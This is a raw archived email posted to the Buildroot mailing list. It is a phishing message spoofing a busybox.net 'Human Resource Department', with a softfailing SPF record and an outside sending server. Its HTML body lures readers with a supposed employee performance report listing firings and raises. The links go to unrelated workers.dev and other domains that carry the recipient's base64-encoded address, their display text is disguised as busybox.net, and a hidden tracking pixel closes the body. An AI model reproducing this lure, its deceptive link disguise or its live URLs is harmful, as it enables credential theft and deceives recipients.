Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 2DFCCE77188
	for <buildroot@archiver.kernel.org>; Fri,  3 Jan 2025 14:21:15 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 9D2C54094A;
	Fri,  3 Jan 2025 14:21:14 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 49Gd3aEPFgf0; Fri,  3 Jan 2025 14:21:13 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 3C82D4093A
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp4.osuosl.org (Postfix) with ESMTP id 3C82D4093A;
	Fri,  3 Jan 2025 14:21:13 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id 3CA16F27
 for <buildroot@buildroot.org>; Fri,  3 Jan 2025 14:21:11 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 083B4810B9
 for <buildroot@buildroot.org>; Fri,  3 Jan 2025 14:21:11 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id ceM7vWMRS6sw for <buildroot@buildroot.org>;
 Fri,  3 Jan 2025 14:21:10 +0000 (UTC)
X-Greylist: delayed 602 seconds by postgrey-1.37 at util1.osuosl.org;
 Fri, 03 Jan 2025 14:21:10 UTC
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 1D2E481094
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 1D2E481094
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=198.23.221.4;
 helo=server3595.cc; envelope-from=hr@busybox.net; receiver=<UNKNOWN> 
Received: from server3595.cc (server3595.cc [198.23.221.4])
 by smtp1.osuosl.org (Postfix) with ESMTPS id 1D2E481094
 for <buildroot@busybox.net>; Fri,  3 Jan 2025 14:21:10 +0000 (UTC)
From: "Human Resource Department" <hr@busybox.net>
To: buildroot@busybox.net
Date: 3 Jan 2025 06:01:07 -0800
Message-ID: <20250103060106.CD858EEAC7E5ED99@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=re1;
 d=busybox.net; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=hr@busybox.net;
 bh=12WTjPiLYgytkleuuOksrQcnCm+VejqgDtRUig6bAGM=;
 b=rcie18t752FJvxtLBIpYV4v5T/qdgQZ/4pvwPmMbcKVxdFsUno8XOK2JpMSndclgyTXv5g7Yp0ju
 QjVYxHzWb7+ZLycFUB2dRsmaVCQbIKfOLBw9OMgWKSZHhV0f7aKIOyCFuHx3a26Cv+5E1mh/bEWE
 jmIuX8IVqicqxI38lS4GDbGx89ZwYF4LKSuZuyeNhqqUH4nrIwH+XiVdCBa+/TX1OE0UIDIW6V94
 f8yjYW/AF4Jy9goGZbaiq5/jhCMe0OGU552hhgYIviab3NoxzKcILDGDNY55kZE2onCIlh4q0+TT
 VRvqprnu9HxBkRgZIAsBO7nnjT70gCoU2USbfA==
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Employee Performance Report - November/December 2024
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5239264254530838184=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============5239264254530838184==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
<body>
<p>Dear&nbsp;buildroot@busybox.net&nbsp;,<br><br>check below link your empl=
oyees performance report for last month.<br><br>
<a href=3D"https://vqqznoqjxh.charliec-glenn.workers.dev?qtylsspskjihvxoers=
tdyuqzcahbvc=3DYnVpbGRyb290QGJ1c3lib3gubmV0"><font color=3D"#f00f72"><stron=
g>http://buildroot@busybox.netemployeesperformance_report_DECEMBER_2024</st=
rong></font></a></p><div id=3D"forwardbody1">
<div style=3D"box-sizing: border-box; user-select: inherit;">
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;">

&nbsp;</div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;"><em style=3D"font-style: italic; box-s=
izing: border-box; user-select: inherit;">Note: All names highlighted in<sp=
an style=3D"box-sizing: border-box; user-select: inherit;">&nbsp;</span><fo=
nt color=3D"#fd0217"><strong>Red</strong></font><span style=3D"box-sizing: =
border-box; user-select: inherit;">&nbsp;</span>indicate&nbsp;employees to =
be terminated<br>While does in <font color=3D"#0604fb"><strong>Blue</strong=
> </font>will have a salary upgrade this month end.</em>
</div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;">&nbsp;</div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;">Best regards,</div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;">Director of HR &nbsp;<br style=3D"box-=
sizing: border-box; user-select: inherit;"><br style=3D"box-sizing: border-=
box; user-select: inherit;"></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
 rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;=20
text-decoration-thickness: initial;"><strong style=3D"font-weight: bold; bo=
x-sizing: border-box; user-select: inherit;">Human Resource Department<br><=
/strong><br style=3D"box-sizing: border-box; user-select: inherit;">hr.dire=
ctor<a href=3D"https://vqqznoqjxh.charliec-glenn.workers.dev?afhpufnbwhxilp=
gidyydkxuwfdxqgj=3DYnVpbGRyb290QGJ1c3lib3gubmV0">@busybox.net</a> | Headqua=
rters<br>www<a href=3D"https://ajsoj.byqzraabttojh.com/?kycjvygqzheuzannzsz=
uonagvucngh=3DYnVpbGRyb290QGJ1c3lib3gubmV0">
<font color=3D"#fc4503">.busybox.net</font></a><br><strong>1/3/2025 6:01:06=
 a.m.</strong><br><br><br><br style=3D"box-sizing: border-box; user-select:=
 inherit;"></div></div>
<img width=3D"0" height=3D"0" class=3D"v1flm-open" style=3D"border: 0px cur=
rentColor; border-image: none; width: 0px; height: 0px; display: block;" sr=
c=3D""></div></body></html>

--===============5239264254530838184==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============5239264254530838184==--
